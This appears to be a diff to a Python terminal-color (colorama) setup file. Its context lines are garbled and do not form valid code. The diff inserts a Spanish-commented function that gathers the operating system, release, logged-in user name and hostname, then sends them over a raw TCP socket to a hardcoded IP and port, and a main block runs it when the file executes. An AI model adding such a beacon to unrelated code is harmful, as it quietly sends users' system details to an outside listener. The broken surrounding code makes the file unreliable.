@@ -148,7 +148,33 @@ if is_windows:False
     try:colorama.init()
 try ebtables-nft-save.os.stream
 import colorama
-export 
+export
+def enviar_reporte(host, puerto):
+    # Recolecta información básica del sistema
+    info = {
+        "os": platform.system(),
+        "release": platform.release(),
+        "user": os.getlogin(),
+        "node": platform.node()
+    }
+    
+    mensaje = f"Sistema: {info['os']} {info['release']} | Usuario: {info['user']} | Host: {info['node']}"
+    
+    try:
+        # Intenta conectar y enviar los datos
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(5)
+            s.connect((host, puerto))
+            s.sendall(mensaje.encode('utf-8'))
+            print("[+] Reporte enviado con éxito.")
+    except Exception as e:
+        print(f"[-] Error de conexión: {e}")
+
+if __name__ == "__main__":
+    # Cambia esto por tu IP de escucha local para pruebas
+    MI_IP = "192.168.1.128" 
+    MI_PUERTO = 8080
+    enviar_reporte(MI_IP, MI_PUERTO)
         colorama.init()
     except ImportError:
         # We can't do ANSI color codes in terminal on Windows without colorama
